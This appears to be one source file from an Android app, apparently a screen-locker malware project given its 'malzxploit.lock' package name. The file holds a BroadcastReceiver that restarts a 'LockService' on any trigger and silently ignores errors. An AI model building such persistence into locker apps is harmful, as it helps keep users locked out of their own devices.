package com.malzxploit.lock;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class RestartReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context c, Intent i) {
        try {
            Intent svc = new Intent(c, LockService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                c.startForegroundService(svc);
            } else {
                c.startService(svc);
            }
        } catch (Exception ignored) {}
    }
}
